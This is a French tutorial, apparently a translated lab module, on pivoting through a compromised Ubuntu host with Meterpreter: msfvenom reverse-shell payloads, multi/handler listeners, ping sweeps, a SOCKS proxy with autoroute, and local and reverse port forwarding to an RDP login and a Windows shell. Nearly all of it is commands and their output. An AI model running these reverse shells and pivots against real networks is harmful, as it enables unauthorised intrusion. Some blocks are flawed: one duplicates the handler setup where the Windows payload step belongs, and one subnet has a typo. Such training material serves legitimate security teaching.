Tunnellisation Meterpreter et redirection de port
=======================================

* * * * *

Considérons maintenant un scénario où nous avons notre accès au shell Meterpreter sur le serveur Ubuntu (l'hôte pivot), et nous voulons effectuer des analyses d'énumération via l'hôte pivot, mais nous aimerions profiter des commodités que les sessions Meterpreter nous apportent . Dans de tels cas, nous pouvons toujours créer un pivot avec notre session Meterpreter sans compter sur la redirection de port SSH. Nous pouvons créer un shell Meterpreter pour le serveur Ubuntu avec la commande ci-dessous, qui renverra un shell sur notre hôte d'attaque sur le port `8080`.

#### Création de la charge utile pour l'hôte Ubuntu Pivot

Création de la charge utile pour l'hôte Ubuntu Pivot

```
dsgsec@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob

```

Avant de copier la charge utile, nous pouvons démarrer un [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), également appelé gestionnaire de charge utile générique.

#### Configuration et démarrage du multi/handler

Configurer et démarrer le multi/handler

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 

```

Nous pouvons copier le fichier binaire `backupjob` sur l'hôte pivot Ubuntu `over SSH` et l'exécuter pour obtenir une session Meterpreter.

#### Exécution de la charge utile sur l'hôte pivot

Exécution de la charge utile sur l'hôte pivot

```
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob

```

Nous devons nous assurer que la session Meterpreter est établie avec succès lors de l'exécution de la charge utile.

#### Création d'une session Meterpreter

Création de session Meterpreter

```
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu

```

Nous savons que la cible Windows se trouve sur le réseau 172.16.5.0/23. Donc, en supposant que le pare-feu sur la cible Windows autorise les requêtes ICMP, nous voudrions effectuer un balayage ping sur ce réseau. Nous pouvons le faire en utilisant Meterpreter avec le module `ping_sweep` , qui générera le trafic ICMP de l'hôte Ubuntu vers le réseau `172.16.5.0/23`.

#### Balayage ping

Balayage de ping

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

Nous pourrions également effectuer un balayage ping à l'aide d'une `boucle for` directement sur un hôte pivot cible qui enverra un ping à n'importe quel appareil dans la plage de réseau que nous spécifions. Voici deux balayages ping utiles pour les lignes simples que nous pourrions utiliser pour les hôtes pivot basés sur Linux et Windows.

#### Ping Sweep For Loop sur les hôtes Linux Pivot

Ping Sweep For Loop sur les hôtes Linux Pivot

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

```

#### Balayage ping pour la boucle à l'aide de CMD

Balayage ping pour la boucle à l'aide de CMD

```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

```

#### Ping Sweep à l'aide de PowerShell

Balayage ping à l'aide de PowerShell

```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```

Remarque : Il est possible qu'un balayage ping n'aboutisse pas à des réponses réussies lors de la première tentative, en particulier lors de la communication sur les réseaux. Cela peut être dû au temps qu'il faut à un hôte pour créer son cache arp. Dans ces cas, il est bon de tenter notre balayage ping au moins deux fois pour s'assurer que le cache arp est construit.

Il peut y avoir des scénarios où le pare-feu d'un hôte bloque le ping (ICMP), et le ping ne nous donnera pas de réponses réussies. Dans ces cas, nous pouvons effectuer une analyse TCP sur le réseau 172.16.5.0/23 avec Nmap. Au lieu d'utiliser SSH pour la redirection de port, nous pouvons également utiliser le module de routage post-exploitation de Metasploit `socks_proxy` pour configurer un proxy local sur notre hôte d'attaque. Nous allons configurer le proxy SOCKS pour `SOCKS version 4a`. Cette configuration SOCKS démarrera un écouteur sur le port `9050` et acheminera tout le trafic reçu via notre session Meterpreter.

#### Configuration du proxy SOCKS de MSF

Configuration du proxy SOCKS de MSF

```
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

```

#### Confirmation que le serveur proxy est en cours d'exécution

Confirmation que le serveur proxy est en cours d'exécution

```
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

```

Après avoir lancé le serveur SOCKS, nous allons configurer des chaînes proxy pour acheminer le trafic généré par d'autres outils comme Nmap via notre pivot sur l'hôte Ubuntu compromis. Nous pouvons ajouter la ligne ci-dessous à la fin de notre fichier `proxychains.conf` situé dans `/etc/proxychains.conf` si elle ne s'y trouve pas déjà.

#### Ajout d'une ligne à proxychains.conf si nécessaire

Ajouter une ligne à proxychains.conf si nécessaire

```
socks4 	127.0.0.1 9050
```

Remarque : selon la version du serveur SOCKS, nous pouvons parfois avoir besoin de remplacer socks4 par socks5 dans proxychains.conf.

Enfin, nous devons dire à notre module socks_proxy de router tout le trafic via notre session Meterpreter. Nous pouvons utiliser le module `post/multi/manage/autoroute` de Metasploit pour ajouter des routes pour le sous-réseau 172.16.5.0, puis acheminer tout le trafic de nos chaînes proxy.

#### Création d'itinéraires avec AutoRoute

Création d'itinéraires avec AutoRoute

```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed

```

Il est également possible d'ajouter des routes avec autoroute en exécutant autoroute depuis la session Meterpreter.

Création d'itinéraires avec AutoRoute

```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Après avoir ajouté la ou les routes nécessaires, nous pouvons utiliser l'option `-p` pour répertorier les routes actives afin de nous assurer que notre configuration est appliquée comme prévu.

#### Liste des routes actives avec AutoRoute

Liste des routes actives avec AutoRoute

```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1

```

Comme vous pouvez le voir sur la sortie ci-dessus, la route a été ajoutée au réseau 172.16.5.0/23. Nous pourrons désormais utiliser des proxychains pour acheminer notre trafic Nmap via notre session Meterpreter.

#### Test des fonctionnalités de proxy et de routage

Test des fonctionnalités de proxy et de routage

```
dsgsec@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

* * * * *

Redirection de port
---------------

La redirection de port peut également être effectuée à l'aide du module `portfwd` de Meterpreter. Nous pouvons activer un écouteur sur notre hôte d'attaque et demander à Meterpreter de transférer tous les paquets reçus sur ce port via notre session Meterpreter vers un hôte distantsur le réseau 172.16.5.0/23.

#### Options Portfwd

Options de transfert

```
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.

```

#### Création d'un relais TCP local

Création d'un relais TCP local

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

La commande ci-dessus demande à la session Meterpreter de démarrer un écouteur sur le port local de notre hôte d'attaque (`-l`) `3300` et de transférer tous les paquets vers le serveur Windows distant (`-r`) `172.16.5.19` sur `3389 ` port (`-p`) via notre session Meterpreter. Maintenant, si nous exécutons xfreerdp sur notre localhost:3300, nous pourrons créer une session de bureau à distance.

#### Connexion à Windows Target via localhost

Connexion à Windows Target via localhost

```
dsgsec@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123

```

#### Sortie Netstat

Nous pouvons utiliser Netstat pour afficher des informations sur la session que nous avons récemment établie. D'un point de vue défensif, nous pouvons bénéficier de l'utilisation de Netstat si nous soupçonnons qu'un hôte a été compromis. Cela nous permet de voir toutes les sessions qu'un hôte a établies.

Sortie Netstat

```
dsgsec@htb[/htb]$ netstat -antp

tcp 0 0 127.0.0.1:54652 127.0.0.1:3300 ÉTABLI 4075/xfreerdp

```

* * * * *

Redirection de port inversée Meterpreter
-----------------------------------

Semblable à la redirection de port local, Metasploit peut également effectuer une `redirection de port inverse` avec la commande ci-dessous, où vous voudrez peut-être écouter sur un port spécifique sur le serveur compromis et transférer tous les shells entrants du serveur Ubuntu vers notre hôte d'attaque. Nous allons démarrer un écouteur sur un nouveau port sur notre hôte d'attaque pour Windows et demander au serveur Ubuntu de transmettre toutes les requêtes reçues au serveur Ubuntu sur le port `1234` à notre écouteur sur le port `8081`.

Nous pouvons créer une redirection de port inversée sur notre shell existant à partir du scénario précédent à l'aide de la commande ci-dessous. Cette commande transfère toutes les connexions sur le port `1234` s'exécutant sur le serveur Ubuntu à notre hôte d'attaque sur le port local (`-l`) `8081`. Nous allons également configurer notre écouteur pour écouter sur le port 8081 pour un shell Windows.

#### Règles de transfert de port inversé

Règles de transfert de port inversé

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Relais TCP local créé : 10.10.14.18:8081 <-> :1234

```

#### Configuration et démarrage de multi/handler

Configurer et démarrer le multi/gestionnaire

```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 

```

Nous pouvons maintenant créer une charge utile reverse shell qui renverra une connexion à notre serveur Ubuntu sur `172.16.5.129`:`1234` lorsqu'il sera exécuté sur notre hôte Windows. Une fois que notre serveur Ubuntu reçoit cette connexion, il la transmet à `l'adresse IP de l'hôte d'attaque` : `8081` que nous avons configurée.

#### Génération de la charge utile Windows

Génération de la charge utile Windows

```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Enfin, si nous exécutons notre charge utile sur l'hôte Windows, nous devrions pouvoir recevoir un shell de Windows pivoté via le serveur Ubuntu.

#### Établir la session Meterpreter

Établir la session Meterpreter

```
[*] Démarrage du gestionnaire TCP inversé sur 0.0.0.0:8081
[*] Envoi de l'étape (200262 octets) au 10.10.14.18
[*] Meterpreter session 2 ouverte (10.10.14.18:8081 -> 10.10.14.18:40173 ) au 2022-03-04 15:26:14 -0500

compteur> shell
Processus 2336 créé.
Canal 1 créé.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. Tous les droits sont réservés.

C:\>

```

* * * * *